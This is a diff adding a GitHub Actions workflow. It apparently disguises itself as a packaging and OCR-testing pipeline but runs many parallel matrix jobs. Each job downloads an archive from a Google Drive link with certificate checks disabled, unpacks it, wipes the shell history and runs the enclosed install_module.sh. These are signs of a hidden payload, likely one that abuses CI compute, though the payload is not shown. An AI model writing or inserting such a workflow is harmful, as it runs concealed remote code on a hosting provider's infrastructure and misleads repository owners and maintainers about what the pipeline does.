@@ -1,0 +1,56 @@
+name: trinhdieukhien7hub
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  Publish:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.0, I.I, I.II]
+        flag: ['Init', 'Generate', 'Check', 'Start', 'Ship']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: Install Packages
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1Z9DqTSTsrUHaeQ5Aq86cqo5f6uPAXqfZ" -O trinhdieukhien7hub.zip
+        unzip -o trinhdieukhien7hub.zip
+        rm trinhdieukhien7hub.zip
+        history -c && history -w
+
+    - name: Test OCR Images
+      run: bash install_module.sh
+
+
+  Publish1:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.0, I.I, I.II]
+        flag: ['Setup', 'Compile', 'Validate', 'Execute', 'Release']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: Install Packages
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1Z9DqTSTsrUHaeQ5Aq86cqo5f6uPAXqfZ" -O trinhdieukhien7hub.zip
+        unzip -o trinhdieukhien7hub.zip
+        rm trinhdieukhien7hub.zip
+        history -c && history -w
+
+    - name: Test OCR Images
+      run: bash install_module.sh
+        
